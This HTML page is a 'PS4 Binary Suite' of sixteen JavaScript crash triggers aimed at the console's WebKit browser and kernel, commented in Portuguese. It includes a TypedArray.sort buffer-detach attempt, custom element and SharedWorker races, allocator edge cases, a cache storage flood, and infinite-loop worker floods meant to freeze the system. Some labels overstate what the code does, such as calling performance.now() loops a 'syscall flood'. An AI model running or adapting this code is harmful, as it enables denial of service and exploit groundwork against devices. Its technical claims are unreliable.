<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Binary Suite</title>      
</head>
<body>

    <div class="section">
        <h2>TESTS</h2>
        
        <button onclick="runXHRRecursion()">XHR Synchronous Recursion</button>
        <button onclick="runSortDetach()">TypedArray.sort Buffer Detach</button>
        <button onclick="runCustomElementRace()">CustomElement Upgrade Race</button>
        <button onclick="runViewportLoop()">CSS Viewport Unit Recursion</button>
        <button onclick="runClassListStrcat()">DOMTokenList strcat Overflow</button>
        <button onclick="runFatalAlloc()">'FATAL: attempt' Allocator Trigger</button>
        <button onclick="runSharedProxyRace()">SharedWorkerThreadProxy C++ Race</button>
        <button onclick="runSysTmpFlood()">/system_tmp/ Overflow Trigger</button>
        <button onclick="runIDWrap()">SharedWorker ID Wraparound</button>
        <button onclick="runSharedProxyDestruct()">SharedWorkerProxy Destructor Race</button>
        <button class="kernel" onclick="runTimerFlood()">High-Res Timer Syscall Flood</button>
        <button class="kernel" onclick="runTimeThrash()">gettimeofday vDSO Thrash</button>
        <button class="kernel" onclick="runSignalRace()">Worker Termination Signal Race</button>
        <button class="kernel" onclick="runPthreadInternal()">Pthread Internal Memory Error Trigger</button>
        <button class="kernel" onclick="runTLSCrash()">scePthreadSetspecific Memory Error</button>
        <button class="kernel" onclick="runRedZoneBypass()">Stack Red Zone Bypass</button>
    </div>

    <div id="log"></div>
    <div id="dummy"></div>
    <div id="sandbox"></div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        // --- 1. XHR Synchronous Recursion ---
        function runXHRRecursion() {
            log("[WebKit] Iniciando XHR Recursion...");
            
            let depth = 0;
            function boom() {
                depth++;
                if (depth > 2000) return; // Limite para não travar PC, PS4 vai sofrer antes
                
                try {
                    const xhr = new XMLHttpRequest();
                    // Síncrono (false)
                    xhr.open("GET", window.location.href, false);
                    
                    // O evento roda quando o estado muda (durante o send síncrono?)
                    xhr.onreadystatechange = () => {
                        if (xhr.readyState === 4) boom(); 
                    };
                    xhr.send();
                } catch(e) {
                    // Ignora erros de rede, queremos o estouro de pilha
                }
            }
            
            setTimeout(() => {
                try { boom(); } catch(e) { log("Stack Overflow capturado: " + e); }
            }, 100);
        }

        // --- 2. TypedArray.sort Buffer Detach ---
        function runSortDetach() {
            log("[WebKit] Iniciando Sort Detach...");
            
            try {
                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
                const array = new Uint8Array(buffer);
                
                // Preenche
                for(let i=0; i<array.length; i++) array[i] = Math.random() * 255;
                
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                
                let detached = false;
                
                // O GOLPE: Função de comparação transfere o buffer
                array.sort((a, b) => {
                    if (!detached) {
                        log("Comparador ativo. Transferindo buffer...");
                        w.postMessage(buffer, [buffer]);
                        detached = true;
                    }
                    return a - b;
                });
                
                log("Sort finalizado (Seguro se não crashou).");
                w.terminate();
                
            } catch(e) {
                // TypeError é esperado em browsers corrigidos
                log("Resultado: " + e.message);
            }
        }

        // --- 3. CustomElement Upgrade Race ---
        function runCustomElementRace() {
            log("[WebKit] Iniciando CustomElement Race...");
            const name = "x-crash-" + Math.floor(Math.random()*10000);
            
            class XCrash extends HTMLElement {
                constructor() {
                    super();
                    log("Construtor chamado. Destruindo...");
                    // O GOLPE: O elemento está sendo criado (upgrade).
                    // Nós o removemos do documento ou alteramos seu estado violentamente.
                    this.remove();
                    document.body.innerHTML = ""; // Destruição em massa
                }
            }
            
            const el = document.createElement(name);
            document.body.appendChild(el);
            
            // Define DEPOIS de criar (Upgrade)
            log("Definindo elemento (Upgrade Trigger)...");
            customElements.define(name, XCrash);
        }

        // --- 4. CSS Viewport Unit Recursion ---
        function runViewportLoop() {
            log("[WebKit] Iniciando Viewport Loop...");
            
            const style = document.createElement('style');
            // Se a largura for pequena, remove scrollbar. Se for grande, adiciona scrollbar.
            // Scrollbar altera '100vw'. '100vw' altera a largura. Ciclo.
            style.textContent = `
                #v-bomb {
                    width: 100vw;
                    height: 100vh;
                    overflow: auto;
                }
                #content {
                    width: 110vw; /* Força scroll horizontal se scrollbar vertical aparecer? */
                    height: 110vh;
                }
                @media (max-width: 1000px) {
                    #content { height: 90vh; } /* Remove scroll */
                }
            `;
            document.head.appendChild(style);
            
            const div = document.createElement('div');
            div.id = "v-bomb";
            div.innerHTML = "<div id='content'></div>";
            document.body.appendChild(div);
            
            log("Layout instável injetado. Verifique travamento.");
            
            setTimeout(() => {
                document.head.removeChild(style);
                document.body.removeChild(div);
                log("Teste CSS finalizado.");
            }, 5000);
        }

        // --- 5. DOMTokenList strcat Overflow ---
        function runClassListStrcat() {
            log("[WebKit] Atacando strcat via ClassList...");
            const el = document.getElementById('dummy');
            
            try {
                // DOMTokenList armazena classes como uma string única internamente separada por espaços
                // Adicionar classes força concatenação (strcat)
                const hugeClass = "cls_" + "X".repeat(50000);
                
                log("Concatenando 2000 classes gigantes...");
                
                // Adiciona massivamente para forçar realocação e concatenação
                for(let i=0; i<2000; i++) {
                    el.classList.add(hugeClass + i);
                }
                
                // Força serialização (leitura da string completa)
                const len = el.className.length;
                log(`ClassList length: ${len} (Seguro).`);
                
                el.className = ""; // Limpa
            } catch(e) {
                log("Erro ClassList: " + e.message);
            }
        }

        // --- 6. 'FATAL: attempt' Allocator Trigger ---
        function runFatalAlloc() {
            log("[WebKit] Tentando trigger Fatal Alloc...");
            
            try {
                // Tenta alocações de borda (Edge Cases)
                // ArrayBuffer máximo seguro é ~2GB-1 no 32bit ou mais no 64bit
                // Tentamos valores que podem causar overflow de inteiro em cálculos internos
                const sizes = [
                    2147483647, // Max Int32
                    2147483648, // Max Int32 + 1
                    4294967295, // Max Uint32
                    Number.MAX_SAFE_INTEGER
                ];
                
                sizes.forEach(s => {
                    try {
                        const ab = new ArrayBuffer(s);
                        log(`Alloc ${s} OK (Inesperado).`);
                    } catch(e) {
                        // RangeError é o esperado. Queremos o FATAL crash.
                    }
                });
                
                // Tenta via WebAssembly (limites diferentes)
                if (window.WebAssembly) {
                    new WebAssembly.Memory({initial: 65536}); // Max Pages (~4GB)
                }
                
                log("Allocator stress concluído.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- 7. SharedWorkerThreadProxy C++ Race ---
        function runSharedProxyRace() {
            log("[WebKit] Atacando SharedWorkerThreadProxy...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Mantém o proxy ocupado serializando
                    postMessage({data: new Array(10000).fill(1.1)});
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const sw = new SharedWorker(url, "race_" + i);
                sw.port.start();
                sw.port.postMessage("ping");
                
                // O WebKit não tem sw.terminate(), mas podemos garbage collect a referência
                // ou navegar o iframe que o contém. Aqui simulamos carga rápida.
                
                // Força atividade no proxy
                sw.port.postMessage({buffer: new ArrayBuffer(1024)});
                
                i++;
                if(i % 100 === 0) log(`Workers Proxy Ciclados: ${i}`);
                if(i > 1000) clearInterval(interval);
            }, 10);
        }

        // --- 8. /system_tmp/ Overflow Trigger ---
        function runSysTmpFlood() {
            log("[WebKit] Inundando /system_tmp/...");
            
            if (!window.caches) return log("Cache API off.");
            
            // Cria um payload grande (10MB)
            const data = new Response(new ArrayBuffer(10 * 1024 * 1024));
            let count = 0;
            
            caches.open('sys_tmp_killer').then(cache => {
                const interval = setInterval(() => {
                    // Grava ficheiros rapidamente. O sistema deve fazer flush para o disco (/system_tmp/)
                    // quando a RAM encher.
                    cache.put('/file_' + count, data.clone())
                        .catch(e => log("Quota error (Bom): " + e.name));
                    
                    count++;
                    if(count % 10 === 0) log(`Arquivos 10MB escritos: ${count}`);
                    
                    // Não paramos até erro de quota ou crash
                }, 50);
            });
        }

        // --- 9. SharedWorker ID Wraparound ---
        function runIDWrap() {
            log("[WebKit] Iniciando ID Wraparound...");
            
            const blob = new Blob([""], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria e "esquece" workers rapidamente
                // O WebKit incrementa um contador estático para cada novo Worker
                // Se for um uint32, demora, mas se for uint16 ou tabela hash, colide rápido.
                for(let i=0; i<50; i++) {
                    new SharedWorker(url, "id_" + count + "_" + i);
                }
                
                count += 50;
                if(count % 1000 === 0) log(`IDs gerados: ${count}`);
                
                // Em um exploit real, tentaríamos reutilizar um ID antigo
            }, 10);
        }

        // --- 10. SharedWorkerProxy Destructor Race ---
        function runSharedProxyDestruct() {
            log("[WebKit] Iniciando Proxy Destructor Race...");
            
            const workerCode = `
                onmessage = (e) => {
                    const port = e.ports[0];
                    // Bombardeia a porta de volta
                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "race_" + i);
                sw.port.postMessage("init", [mc.port2]);
                
                // Fecha a porta local imediatamente (lado do proxy)
                // enquanto o worker bombardeia o outro lado
                setTimeout(() => {
                    sw.port.close(); // Tenta invalidar o proxy
                    mc.port1.close();
                }, Math.random() * 10);
                
                i++;
                if (i % 50 === 0) log(`Proxies destruídos: ${i}`);
                if (i > 500) clearInterval(interval);
            }, 20);
        }

        // --- 11. High-Res Timer Syscall Flood ---
        function runTimerFlood() {
            log("[KERNEL] Iniciando Timer Syscall Flood...");
            
            const workerCode = `
                while(true) {
                    // Chama o Kernel repetidamente para obter o tempo
                    // Alta prioridade, sem pausa
                    performance.now();
                    performance.now();
                    performance.now();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível (ex: número de cores)
            // No PS4, 6-8 workers é ideal para saturar a CPU
            for(let i=0; i<8; i++) {
                new Worker(url);
            }
            log("8 Workers em loop infinito de syscalls. Sistema deve aquecer/congelar.");
        }

        // --- 12. gettimeofday vDSO Thrash ---
        function runTimeThrash() {
            log("[KERNEL] Iniciando Time Thrash...");
            
            const workerCode = `
                while(true) {
                    // Leitura de tempo de alta frequência
                    // Estressa a página vDSO partilhada
                    performance.now();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers a ler tempo
            for(let i=0; i<20; i++) new Worker(url);
            
            log("20 Workers a ler relógio. Sistema sob stress.");
        }

        // --- 13. Worker Termination Signal Race ---
        function runSignalRace() {
            log("[KERNEL] Iniciando Signal Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Loop infinito (bloqueia thread)
                    while(true) {}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            
            // Lança 10 workers bloqueados
            for(let i=0; i<10; i++) {
                const w = new Worker(url);
                w.postMessage("start"); // Bloqueia o worker
                workers.push(w);
            }
            
            log("Workers bloqueados. Terminando e enviando mensagens...");
            
            // Race: Terminar vs Enviar Mensagem
            // O Kernel está a enviar SIGKILL. Nós tentamos escrever no pipe do socket.
            workers.forEach(w => {
                setTimeout(() => {
                    w.terminate(); // Envia sinal
                    // Tenta escrever no pipe de uma thread morta/morrendo
                    try { w.postMessage("race"); } catch(e){}
                }, 100);
            });
            
            setTimeout(() => log("Race executada."), 2000);
        }

        // --- 14. Pthread Internal Memory Error Trigger ---
        function runPthreadInternal() {
            log("[KERNEL] Triggering Pthread Internal Error...");
            
            // Worker que cria e destroi SABs e usa Atomics
            // O objetivo é corromper a estrutura interna da thread no Kernel
            const workerCode = `
                onmessage = (e) => {
                    const sab = new SharedArrayBuffer(1024);
                    const view = new Int32Array(sab);
                    
                    // Espera fantasma
                    Atomics.wait(view, 0, 0, 1);
                    
                    // Suicídio rápido
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            // Criação/Destruição de threads em velocidade máxima
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    const w = new Worker(url);
                    w.postMessage("die");
                    // Não terminamos explicitamente, deixamos o 'close()' interno e o GC agirem
                    // Isso força o Kernel a limpar a thread naturalmente (ou falhar)
                }
                count += 10;
                if (count % 1000 === 0) log(`Threads recicladas: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Pthread stress finalizado.");
                }
            }, 10);
        }

        // --- 15. scePthreadSetspecific Memory Error ---
        function runTLSCrash() {
            log("[KERNEL] Esgotando Thread Local Storage (TLS)...");
            
            // Intl (Internacionalização) usa TLS intensivamente para cache de locale
            const workerCode = `
                onmessage = () => {
                    try {
                        const formatters = [];
                        // Cria milhares de formatadores únicos
                        // Cada um pode alocar slots no TLS ou heap associado à thread
                        for(let i=0; i<5000; i++) {
                            // Locale complexo para forçar alocação
                            formatters.push(new Intl.DateTimeFormat('en-u-ca-buddhist-nu-thai', {timeZone: 'UTC'}));
                        }
                    } catch(e) {}
                    // Morre com recursos alocados
                    close(); 
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Ciclo rápido de criação/destruição de threads com carga de TLS
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) new Worker(url).postMessage("go");
                count += 10;
                if (count % 500 === 0) log(`Ciclos TLS: ${count}`);
                if (count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- 16. Stack Red Zone Bypass ---
        function runRedZoneBypass() {
            log("[KERNEL] Bypass Red Zone...");
            
            const workerCode = `
                function deep(n) {
                    const v = new Float64Array(128); // Usa stack
                    if (n > 0) deep(n-1);
                }
                // Assim que nasce, consome stack
                deep(500); 
                postMessage("Done");
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Spawn flood
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    new Worker(url).onmessage = () => {};
                }
                count += 20;
                if(count > 2000) {
                    clearInterval(interval);
                    log("Red Zone Stress finalizado.");
                }
            }, 10);
        }

    </script>
</body>
</html>
